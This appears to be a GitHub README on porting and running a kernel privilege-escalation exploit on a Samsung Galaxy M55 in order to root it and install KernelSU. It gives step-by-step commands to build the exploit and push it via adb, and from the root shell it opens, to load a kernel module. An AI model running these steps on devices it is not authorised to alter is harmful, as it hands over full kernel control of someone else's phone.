Profile ported to Samsung Galaxy M55: https://github.com/sarabpal-dev/IonStack-S22U. 
All credit goes to the respective authors.

# Specs
```text
- Device Name: Galaxy M55 5G
- Model: SM-M556B
- SoC: Qualcomm Snapdragon 7 Gen 1
- Region: ZTO - Brazil
- Fingerprint: samsung/m55xqddxx/qssi:14/UP1A.231005.007/M556BXXU4AYB4:user/release-keys
- Device: m55xq
- Board: taro
- Code Name: Android 14
- API Level: 34
- One UI: 6.1
- Security Patch Level: 2025-02-01
- Build Number: UP1A.231005.007.M556BXXU4AYB4
- Baseband: M556BXXU4AYB4,M556BXXU4AYB4
- Kernel: 5.10.226-android12-9-28566349-abM556BXXU4AYB4
```
  <video src="https://github.com/user-attachments/assets/b9338240-abbc-4eee-b269-9cc6ebf4375f" width="100%" controls autoplay muted></video>
  <table>
    <tr>
      <td>
        <img src="https://github.com/user-attachments/assets/3410b40f-1e09-4f9b-8c1a-dc1c64826185"width="300"/>
      </td>
      <td>
        <img src="https://github.com/user-attachments/assets/1502c646-a739-4be6-8b91-995a57185f6a" width="300"/>
      </td>
      <td>
        <img src="https://github.com/user-attachments/assets/60ee5e3b-d9f4-4d59-b55a-408b4f0cde70" width="300" />
      </td>
    </tr>
  </table>


# IF YOU WANT BUILD YOUR OWN M55, FOLLOW THE STEPS:
```sh
sudo apt update && upgrade
sudo apt install python3 python3-pip ipython3
```
```sh
pip install capstone
```
```sh
sudo apt-get update && sudo apt-get upgrade -y
sudo apt autoremove -y
sudo apt-get install gcc -y
```
```sh
git clone https://github.com/thiagobarrios/IonStack-M556B.git
```
```sh
cd IonStack-M556B/target_generator
```
put your "boot.img.lz4" (search your fw on samfw, AP_ file) inside "IonStack-M556B/target_generator/" and execute target_generator/lz4_to_image_kernel.py, Image file will be generated:
```sh
python3 lz4_to_image_kernel.py
```
extract symbols:
```sh
gcc -O2 kallsyms.c -o kallsyms
```
```sh
keep Image file inside the "target_generator" folder and run: 
./kallsyms Image
```
```sh
./extract-ikconfig Image > config.txt
```
generate target.h:
```sh
python3 generate_target.py kallsyms.txt config.txt Image --template target.h -o target.h
```
by yourself, create a "/src/targets/M556BXXU4AYB4" dir, copy target_generator/target.h and the dir "src/targets/X900XXU9DYE5/exp32" to  "/src/targets/M556BXXU4AYB4".
Create a Android folder:
```sh
mkdir -p ~/Android
```
```sh
cd ~/Android
```
download r27c ndk:
```sh
wget https://dl.google.com/android/repository/android-ndk-r27c-linux.zip
```
download and install unzip:
```sh
sudo apt install unzip
```
extract:
```sh
unzip android-ndk-r27c-linux.zip
```
delete zip file:
```sh
rm android-ndk-r27c-linux.zip
```
nano:
```sh
nano ~/.bashrc
```
add this lines in the end:
```sh
# Android NDK
export ANDROID_NDK_HOME=$HOME/Android/android-ndk-r27c
export PATH=$PATH:$ANDROID_NDK_HOME
```
save and exit (Ctrl+O → Enter → Ctrl+X):
```sh
source ~/.bashrc
```
NDK confirmation: /home/your-user/Android/android-ndk-r27c and list ndk folders (build, ndk-build, toolchains, etc.):
```sh
echo $ANDROID_NDK_HOME
ls $ANDROID_NDK_HOME
```
go for main:
```sh
cd IonStack-M556B
```
make:
```sh
make PROJECT=M556BXXU4AYB4 clean preload root-helper
```
on success, push this files via adb:
```sh
adb push cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push cve-exp32 /data/local/tmp/cve-exp32
adb shell chmod 755 /data/local/tmp/cve-exp32
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
```
run the exploit via adb:
```sh
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
adb shell "/data/local/tmp/cve-2026-43499-root"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
adb install KernelSU_Next_v3.3.0-release.apk
adb push kernelsu-android12-5.10.ko /data/local/tmp/kernelsu-android12-5.10.ko
adb shell "/data/local/tmp/cve-2026-43499-root -c 'insmod /data/local/tmp/kernelsu-android12-5.10.ko'"
```
or use TonySamaaaa script on device side via Termux Wireless debug (exploit.sh):
```sh
adb push exploit.sh /data/local/tmp/exploit.sh
adb shell sh /data/local/tmp/exploit.sh
```


